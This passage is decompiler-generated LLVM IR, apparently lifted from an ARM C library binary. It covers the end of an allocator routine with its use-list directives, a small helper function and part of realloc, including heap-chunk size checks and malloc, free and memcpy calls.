  %v3_1305c = icmp ult i32 %v1_13058, %v1_12c64
  br i1 %v3_1305c, label %dec_label_pc_13088, label %dec_label_pc_13064

dec_label_pc_13064:                               ; preds = %bb168
  %v0_13064 = load i32, i32* @sl, align 4
  %v2_13064 = sub i32 %v1_13058, %v0_13064
  %v2_13068 = add i32 %v0_13064, %v3_1304c
  store i32 %v2_13068, i32* %r1.global-to-local, align 4
  %v1_1306c = or i32 %v2_13064, 1
  store i32 %v1_1306c, i32* %r3.global-to-local, align 4
  %v1_13070 = or i32 %v0_13064, 1
  store i32 %v1_13070, i32* %r2.global-to-local, align 4
  %v1_13074 = add i32 %v3_1304c, 8
  store i32 %v1_13074, i32* %r0.global-to-local, align 4
  store i32 %v1_13070, i32* %v2_13050, align 4
  %v0_1307c = load i32, i32* %r1.global-to-local, align 4
  %v1_1307c = load i32, i32* %lr.global-to-local, align 4
  %v2_1307c = add i32 %v1_1307c, 44
  %v3_1307c = inttoptr i32 %v2_1307c to i32*
  store i32 %v0_1307c, i32* %v3_1307c, align 4
  %v0_13080 = load i32, i32* %r3.global-to-local, align 4
  %v1_13080 = load i32, i32* %r1.global-to-local, align 4
  %v2_13080 = add i32 %v1_13080, 4
  %v3_13080 = inttoptr i32 %v2_13080 to i32*
  store i32 %v0_13080, i32* %v3_13080, align 4
  br label %dec_label_pc_13098

dec_label_pc_13088:                               ; preds = %bb157, %bb168, %dec_label_pc_12e64
  %v0_13088 = call i32 @__GI___errno_location()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_13090 = inttoptr i32 %v0_13088 to i32*
  store i32 12, i32* %v2_13090, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13098

dec_label_pc_13098:                               ; preds = %bb151, %bb150, %dec_label_pc_13064, %dec_label_pc_12cac, %dec_label_pc_13088
  %v0_13098 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13098, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1309c

dec_label_pc_1309c:                               ; preds = %.thread1, %dec_label_pc_12c78, %.thread121, %dec_label_pc_12ae8, %dec_label_pc_12adc, %dec_label_pc_12944, %dec_label_pc_128c8, %dec_label_pc_13098
  store i32 %v2_127f0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r2.global-to-local, align 4
  %v4_130ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 24) to i32*), align 4
  store i32 %v4_130ac, i32* @ip, align 4
  store i32 78008, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_130ac)
  br label %dec_label_pc_130b8

dec_label_pc_130b8:                               ; preds = %dec_label_pc_12828, %dec_label_pc_1309c
  %v0_130b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_130b8, i32* %r0.global-to-local, align 4
  store i32 %v3_127c4, i32* @r4, align 4
  store i32 %v6_127c4, i32* @r5, align 4
  store i32 %v9_127c4, i32* @r6, align 4
  store i32 %v12_127c4, i32* @r7, align 4
  store i32 %v15_127c4, i32* @r8, align 4
  store i32 %v18_127c4, i32* @sb, align 4
  store i32 %v21_127c4, i32* @sl, align 4
  store i32 %v24_127c4, i32* @fp, align 4
  store i32 %v27_127c4, i32* @lr, align 4
  ret i32 %v0_130b8

; uselistorder directives
  uselistorder i32 %v0_13064, { 1, 0, 2 }
  uselistorder i32 %v3_1304c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13048, { 1, 0 }
  uselistorder i32 %v2_1302c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_13024, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12fdc, { 1, 2, 0 }
  uselistorder i32 %v0_12fa4, { 1, 0 }
  uselistorder i32 %v0_12f98, { 1, 0 }
  uselistorder i32 %v2_12f88, { 1, 0 }
  uselistorder i32 %v2_12f18, { 2, 1, 0 }
  uselistorder i32 %v2_12f00, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12ef8, { 1, 0, 2 }
  uselistorder i32 %v1_12ef4, { 2, 1, 0 }
  uselistorder i32 %v0_12ef4, { 3, 1, 2, 0 }
  uselistorder i32 %v1_12ed8, { 1, 0 }
  uselistorder i32 %v2_12eb0, { 1, 0 }
  uselistorder i32 %v3_12ea4, { 1, 0, 2 }
  uselistorder i32 %v2_12e84, { 1, 0, 2 }
  uselistorder i32* %v2_12e7c, { 1, 0, 2 }
  uselistorder i32 %v0_12e64, { 1, 0 }
  uselistorder i32 %v6_12e40, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12e2c, { 2, 1, 0 }
  uselistorder i32 %v0_12e14, { 1, 0 }
  uselistorder i32 %v2_12dd0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12dcc, { 1, 0 }
  uselistorder i32 %v3_12da4, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_12d84, { 1, 0, 2 }
  uselistorder i32 %v2_12d6c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12d14, { 2, 1, 0 }
  uselistorder i32 %v6_12d08, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_12ce4, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12ca4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12c64, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_12c5c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12c58, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_12c44, { 1, 0 }
  uselistorder i32 %v7_12c04, { 1, 0 }
  uselistorder i32 %v4_12c04, { 1, 0 }
  uselistorder i32 %v0_12bd4, { 1, 0 }
  uselistorder i32 %v2_12ba8, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_12ba454, { 1, 0 }
  uselistorder i32 %v1_12b70, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_12b58., { 1, 2, 0 }
  uselistorder i32 %v0_12b60, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12b60, { 1, 0 }
  uselistorder i32 %v3_12b40, { 1, 0 }
  uselistorder i32 %v4_12b3c, { 1, 0, 2 }
  uselistorder i32 %v1_12aac, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12b04, { 1, 0 }
  uselistorder i32 %v1_12ae8, { 1, 0 }
  uselistorder i32 %v1_12988, { 1, 0 }
  uselistorder i32 %v0_12ac8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_12a90, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12b24.pre, { 1, 2, 0 }
  uselistorder i32 %v0_12a6c, { 2, 1, 0 }
  uselistorder i32 %v3_12a60, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_12980, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_12a28, { 1, 0 }
  uselistorder i32 %v3_12a1c, { 1, 0 }
  uselistorder i32 %v0_12a28, { 1, 0 }
  uselistorder i32 %v3_12a00, { 0, 2, 3, 1 }
  uselistorder i32 %v2_129f0, { 1, 0, 2 }
  uselistorder i32 %v3_129a8, { 2, 1, 0 }
  uselistorder i32 %v0_12998, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12968, { 1, 0 }
  uselistorder i32 %v1_1291c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_12918, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_128bc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_128b0, { 1, 0 }
  uselistorder i32 %v3_12880, { 1, 0 }
  uselistorder i32 %v0_12874, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_12854, { 0, 2, 1, 3 }
  uselistorder i1 %v7_12848, { 1, 0 }
  uselistorder i32 %v0_12820, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 0, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 2, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 35, 32, 33, 1, 34, 36, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 36, 35, 28, 25, 0, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_130b8, { 1, 0 }
  uselistorder label %dec_label_pc_1309c, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_13098, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_13088, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_1301c, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12f98, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_12f90, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12e64, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_12d98, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_12c50, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_12ba4, { 1, 0 }
  uselistorder label %dec_label_pc_12bac.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12b70, { 1, 0 }
  uselistorder label %dec_label_pc_12b24, { 1, 0 }
  uselistorder label %dec_label_pc_12ab8, { 1, 0 }
  uselistorder label %dec_label_pc_12ab4, { 1, 0 }
  uselistorder label %dec_label_pc_12a60, { 1, 0 }
  uselistorder label %dec_label_pc_12a4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12a14, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12a00, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_130cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_130cc:
  %v0_130cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_130cc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_130cc
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_130cc, %bb
  %v10_130e0 = phi i32 [ %arg1, %dec_label_pc_130cc ], [ 0, %bb ]
  ret i32 %v10_130e0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_130e4 = load i32, i32* @r4, align 4
  %v6_130e4 = load i32, i32* @r5, align 4
  %v9_130e4 = load i32, i32* @r6, align 4
  %v12_130e4 = load i32, i32* @r7, align 4
  %v15_130e4 = load i32, i32* @r8, align 4
  %v18_130e4 = load i32, i32* @sb, align 4
  %v21_130e4 = load i32, i32* @sl, align 4
  %v24_130e4 = load i32, i32* @fp, align 4
  %v27_130e4 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_130f0 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_130f0, label %dec_label_pc_13104, label %dec_label_pc_13114

dec_label_pc_13104:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_13108 = call i32 @malloc(i32 %arg2)
  store i32 %v1_13108, i32* %r0.global-to-local, align 4
  store i32 %v1_13108, i32* @r4, align 4
  br label %dec_label_pc_1346c

dec_label_pc_13114:                               ; preds = %entry
  %v2_13114 = icmp eq i32 %arg2, 0
  br i1 %v2_13114, label %dec_label_pc_1311c, label %dec_label_pc_13128

dec_label_pc_1311c:                               ; preds = %dec_label_pc_13114
  %v0_1311c = call i32 @free()
  store i32 %v0_1311c, i32* %r0.global-to-local, align 4
  %v0_13120 = load i32, i32* @r6, align 4
  store i32 %v0_13120, i32* @r4, align 4
  br label %dec_label_pc_1346c

dec_label_pc_13128:                               ; preds = %dec_label_pc_13114
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_13130 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 72) to i32*), align 4
  store i32 %v4_13130, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_13130, i32* %r2.global-to-local, align 4
  %v4_1313c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 36) to i32*), align 4
  store i32 %v4_1313c, i32* %r1.global-to-local, align 4
  %v2_13140 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13140, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_13148 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13148)
  %v0_13154 = load i32, i32* @r4, align 4
  store i32 %v0_13154, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r1.global-to-local, align 4
  %v4_13160 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 16) to i32*), align 4
  store i32 %v4_13160, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1316c.730 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13160)
  %v0_1316c = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_1316c, -32
  br i1 %tmp36, label %dec_label_pc_13188, label %dec_label_pc_13174

dec_label_pc_13174:                               ; preds = %dec_label_pc_13128
  %v0_13174 = call i32 @__GI___errno_location()
  store i32 %v0_13174, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_13180 = inttoptr i32 %v0_13174 to i32*
  store i32 12, i32* %v2_13180, align 4
  br label %dec_label_pc_1346c

dec_label_pc_13188:                               ; preds = %dec_label_pc_13128
  %v1_13188 = add i32 %v0_1316c, 11
  store i32 %v1_13188, i32* %r0.global-to-local, align 4
  %v0_1318c = load i32, i32* @r5, align 4
  %v1_1318c = add i32 %v0_1318c, -4
  %v2_1318c = inttoptr i32 %v1_1318c to i32*
  %v3_1318c = load i32, i32* %v2_1318c, align 4
  store i32 %v3_1318c, i32* %r2.global-to-local, align 4
  %v2_13190 = icmp ugt i32 %v1_13188, 14
  %v7_13190 = icmp eq i32 %v1_13188, 15
  %v2_13194 = xor i1 %v2_13190, true
  %v3_13194 = or i1 %v7_13190, %v2_13194
  br i1 %v3_13194, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_13188
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_13188, %bb
  %v2_13198 = xor i1 %v7_13190, true
  %v3_13198 = and i1 %v2_13190, %v2_13198
  br i1 %v3_13198, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_13198 = and i32 %v1_13188, -8
  store i32 %v5_13198, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_1319c = and i32 %v3_1318c, 2
  %v2_1319c = icmp eq i32 %v1_1319c, 0
  %v1_131a0 = add i32 %v0_1318c, -8
  store i32 %v1_131a0, i32* @sl, align 4
  %v1_131a4 = and i32 %v3_1318c, -4
  store i32 %v1_131a4, i32* @r6, align 4
  br i1 %v2_1319c, label %dec_label_pc_131ac, label %dec_label_pc_13384

dec_label_pc_131ac:                               ; preds = %bb29
  %v1_131ac = load i32, i32* @sb, align 4
  %v3_131ac = icmp ult i32 %v1_131a4, %v1_131ac
  br i1 %v3_131ac, label %dec_label_pc_131b8, label %bb30

bb30:                                             ; preds = %dec_label_pc_131ac
  store i32 %v1_131a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1331c

dec_label_pc_131b8:                               ; preds = %dec_label_pc_131ac
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_131c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_131c0, i32* %r0.global-to-local, align 4
  %v1_131c4 = add i32 %v4_131c0, 44
  %v2_131c4 = inttoptr i32 %v1_131c4 to i32*
  %v3_131c4 = load i32, i32* %v2_131c4, align 4
  store i32 %v3_131c4, i32* %r3.global-to-local, align 4
  %v2_131c8 = add i32 %v1_131a4, %v1_131a0
  store i32 %v2_131c8, i32* @r4, align 4
  %v9_131cc = icmp eq i32 %v2_131c8, %v3_131c4
  %v1_131d0 = add i32 %v2_131c8, 4
  %v2_131d0 = inttoptr i32 %v1_131d0 to i32*
  %v3_131d0 = load i32, i32* %v2_131d0, align 4
  store i32 %v3_131d0, i32* %r1.global-to-local, align 4
  br i1 %v9_131cc, label %dec_label_pc_131d8, label %dec_label_pc_13214

dec_label_pc_131d8:                               ; preds = %dec_label_pc_131b8
  %v1_131d8 = and i32 %v3_131d0, -4
  %v2_131dc = add i32 %v1_131d8, %v1_131a4
  store i32 %v2_131dc, i32* %r1.global-to-local, align 4
  %v1_131e0 = add i32 %v1_131ac, 16
  store i32 %v1_131e0, i32* %r3.global-to-local, align 4
  %v3_131e4 = icmp ult i32 %v2_131dc, %v1_131e0
  br i1 %v3_131e4, label %dec_label_pc_13268, label %dec_label_pc_131ec

dec_label_pc_131ec:                               ; preds = %dec_label_pc_131d8
  %v2_131ec = sub i32 %v2_131dc, %v1_131ac
  %v1_131f0 = urem i32 %v3_1318c, 2
  %v2_131f4 = add i32 %v1_131ac, %v1_131a0
  store i32 %v2_131f4, i32* %r1.global-to-local, align 4
  %v2_131f8 = or i32 %v1_131ac, %v1_131f0
  store i32 %v2_131f8, i32* %r2.global-to-local, align 4
  %v1_131fc = or i32 %v2_131ec, 1
  store i32 %v1_131fc, i32* %r3.global-to-local, align 4
  store i32 %v0_1318c, i32* @r4, align 4
  store i32 %v2_131f8, i32* %v2_1318c, align 4
  %v0_13208 = load i32, i32* %r1.global-to-local, align 4
  %v1_13208 = load i32, i32* %r0.global-to-local, align 4
  %v2_13208 = add i32 %v1_13208, 44
  %v3_13208 = inttoptr i32 %v2_13208 to i32*
  store i32 %v0_13208, i32* %v3_13208, align 4
  %v0_1320c = load i32, i32* %r3.global-to-local, align 4
  %v1_1320c = load i32, i32* %r1.global-to-local, align 4
  %v2_1320c = add i32 %v1_1320c, 4
  %v3_1320c = inttoptr i32 %v2_1320c to i32*
  store i32 %v0_1320c, i32* %v3_1320c, align 4
  br label %dec_label_pc_13450

dec_label_pc_13214:                               ; preds = %dec_label_pc_131b8
  %v1_13214 = and i32 %v3_131d0, -2
  %v2_13218 = add i32 %v1_13214, %v2_131c8
  store i32 %v2_13218, i32* %r3.global-to-local, align 4
  %v1_1321c = add i32 %v2_13218, 4
  %v2_1321c = inttoptr i32 %v1_1321c to i32*
  %v3_1321c = load i32, i32* %v2_1321c, align 4
  store i32 %v3_1321c, i32* %r3.global-to-local, align 4
  %v1_13220 = urem i32 %v3_1321c, 2
  %v2_13220 = icmp eq i32 %v1_13220, 0
  br i1 %v2_13220, label %dec_label_pc_13228, label %dec_label_pc_13268

dec_label_pc_13228:                               ; preds = %dec_label_pc_13214
  %v1_13228 = and i32 %v3_131d0, -4
  store i32 %v1_13228, i32* %r3.global-to-local, align 4
  %v2_1322c = add i32 %v1_13228, %v1_131a4
  store i32 %v2_1322c, i32* %r0.global-to-local, align 4
  %v3_13230 = icmp ult i32 %v2_1322c, %v1_131ac
  br i1 %v3_13230, label %dec_label_pc_13268, label %dec_label_pc_13238

dec_label_pc_13238:                               ; preds = %dec_label_pc_13228
  %v1_13238 = add i32 %v1_131a4, %v0_1318c
  %v2_13238 = inttoptr i32 %v1_13238 to i32*
  %v3_13238 = load i32, i32* %v2_13238, align 4
  store i32 %v3_13238, i32* %r1.global-to-local, align 4
  %v1_1323c = add i32 %v3_13238, 12
  %v2_1323c = inttoptr i32 %v1_1323c to i32*
  %v3_1323c = load i32, i32* %v2_1323c, align 4
  store i32 %v3_1323c, i32* %r3.global-to-local, align 4
  %v9_13240 = icmp eq i32 %v3_1323c, %v2_131c8
  %v1_13244 = add i32 %v2_131c8, 12
  %v2_13244 = inttoptr i32 %v1_13244 to i32*
  %v3_13244 = load i32, i32* %v2_13244, align 4
  store i32 %v3_13244, i32* %r2.global-to-local, align 4
  br i1 %v9_13240, label %dec_label_pc_1324c, label %dec_label_pc_13258

dec_label_pc_1324c:                               ; preds = %dec_label_pc_13238
  %v1_1324c = add i32 %v3_13244, 8
  %v2_1324c = inttoptr i32 %v1_1324c to i32*
  %v3_1324c = load i32, i32* %v2_1324c, align 4
  store i32 %v3_1324c, i32* %r3.global-to-local, align 4
  %v9_13250 = icmp eq i32 %v3_1324c, %v2_131c8
  br i1 %v9_13250, label %dec_label_pc_1325c, label %dec_label_pc_13258

dec_label_pc_13258:                               ; preds = %dec_label_pc_13238, %dec_label_pc_1324c
  %v0_13258 = call i32 @abort()
  store i32 %v0_13258, i32* %r0.global-to-local, align 4
  %v0_1325c.pre = load i32, i32* @r1, align 4
  %v1_1325c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1325c

dec_label_pc_1325c:                               ; preds = %dec_label_pc_1324c, %dec_label_pc_13258
  %v1_1325c = phi i32 [ %v3_13244, %dec_label_pc_1324c ], [ %v1_1325c.pre, %dec_label_pc_13258 ]
  %v0_1325c = phi i32 [ %v3_13238, %dec_label_pc_1324c ], [ %v0_1325c.pre, %dec_label_pc_13258 ]
  %v2_1325c = add i32 %v1_1325c, 8
  %v3_1325c = inttoptr i32 %v2_1325c to i32*
  store i32 %v0_1325c, i32* %v3_1325c, align 4
  %v0_13260 = load i32, i32* %r2.global-to-local, align 4
  %v1_13260 = load i32, i32* %r1.global-to-local, align 4
  %v2_13260 = add i32 %v1_13260, 12
  %v3_13260 = inttoptr i32 %v2_13260 to i32*
  store i32 %v0_13260, i32* %v3_13260, align 4
  %v1_1331c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1331c

dec_label_pc_13268:                               ; preds = %dec_label_pc_131d8, %dec_label_pc_13228, %dec_label_pc_13214
  %v1_13268 = add i32 %v1_131ac, -7
  store i32 %v1_13268, i32* %r0.global-to-local, align 4
  %v1_1326c = call i32 @malloc(i32 %v1_13268)
  store i32 %v1_1326c, i32* @r0, align 4
  store i32 %v1_1326c, i32* %r1.global-to-local, align 4
  %v2_13270 = icmp eq i32 %v1_1326c, 0
  br i1 %v2_13270, label %bb31, label %dec_label_pc_1327c

bb31:                                             ; preds = %dec_label_pc_13268
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13450

dec_label_pc_1327c:                               ; preds = %dec_label_pc_13268
  %v1_13284.pre = load i32, i32* @r4, align 4
  %v1_1327c = add i32 %v1_1326c, -4
  %v2_1327c = inttoptr i32 %v1_1327c to i32*
  %v3_1327c = load i32, i32* %v2_1327c, align 4
  store i32 %v3_1327c, i32* @r3, align 4
  %v1_13280 = add i32 %v1_1326c, -8
  store i32 %v1_13280, i32* @r7, align 4
  %v9_13284 = icmp eq i32 %v1_13280, %v1_13284.pre
  br i1 %v9_13284, label %.thread2, label %dec_label_pc_13294

.thread2:                                         ; preds = %dec_label_pc_1327c
  %v2_13288 = and i32 %v3_1327c, -4
  store i32 %v2_13288, i32* %r3.global-to-local, align 4
  %v2_1328c = load i32, i32* @r6, align 4
  %v3_1328c = add i32 %v2_1328c, %v2_13288
  store i32 %v3_1328c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1331c

dec_label_pc_13294:                               ; preds = %dec_label_pc_1327c
  %v0_13294 = load i32, i32* @r6, align 4
  %v1_13294 = add i32 %v0_13294, -4
  store i32 %v1_13294, i32* @r2, align 4
  %v3_13298 = udiv i32 %v1_13294, 4
  store i32 %v3_13298, i32* @ip, align 4
  %tmp37 = and i32 %v1_13294, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_132a0 = icmp ult i32 %v1_13294, 36
  %v3_132a0 = or i1 %tmp38, %v2_132a0
  %v0_132b0 = load i32, i32* @r5, align 4
  br i1 %v3_132a0, label %dec_label_pc_132b0, label %dec_label_pc_132a4

dec_label_pc_132a4:                               ; preds = %dec_label_pc_13294
  store i32 %v0_132b0, i32* @r1, align 4
  %v0_132a8 = call i32 @memcpy()
  store i32 %v0_132a8, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_132b0:                               ; preds = %dec_label_pc_13294
  %v1_132b0 = inttoptr i32 %v0_132b0 to i32*
  %v2_132b0 = load i32, i32* %v1_132b0, align 4
  store i32 %v2_132b0, i32* %r3.global-to-local, align 4
  %v2_132b4 = inttoptr i32 %v1_1326c to i32*
  store i32 %v2_132b0, i32* %v2_132b4, align 4
  %v0_132b8 = load i32, i32* @r5, align 4
  %v1_132b8 = add i32 %v0_132b8, 4
  %v2_132b8 = inttoptr i32 %v1_132b8 to i32*
  %v3_132b8 = load i32, i32* %v2_132b8, align 4
  store i32 %v3_132b8, i32* %r3.global-to-local, align 4
  %v1_132bc = load i32, i32* %r1.global-to-local, align 4
  %v2_132bc = add i32 %v1_132bc, 4
  %v3_132bc = inttoptr i32 %v2_132bc to i32*
  store i32 %v3_132b8, i32* %v3_132bc, align 4
  %v0_132c0 = load i32, i32* @r5, align 4
  %v1_132c0 = add i32 %v0_132c0, 8
  %v2_132c0 = inttoptr i32 %v1_132c0 to i32*
  %v3_132c0 = load i32, i32* %v2_132c0, align 4
  store i32 %v3_132c0, i32* %r3.global-to-local, align 4
  %v0_132c4 = load i32, i32* @ip, align 4
  %v1_132c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_132c8 = add i32 %v1_132c8, 8
  %v3_132c8 = inttoptr i32 %v2_132c8 to i32*
  store i32 %v3_132c0, i32* %v3_132c8, align 4
  %tmp39 = icmp ult i32 %v0_132c4, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_132d0

dec_label_pc_132d0:                               ; preds = %dec_label_pc_132b0
  %v0_132d0 = load i32, i32* @r5, align 4
  %v1_132d0 = add i32 %v0_132d0, 12
  %v2_132d0 = inttoptr i32 %v1_132d0 to i32*
  %v3_132d0 = load i32, i32* %v2_132d0, align 4
  store i32 %v3_132d0, i32* %r3.global-to-local, align 4
  %v1_132d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_132d4 = add i32 %v1_132d4, 12
  %v3_132d4 = inttoptr i32 %v2_132d4 to i32*
  store i32 %v3_132d0, i32* %v3_132d4, align 4
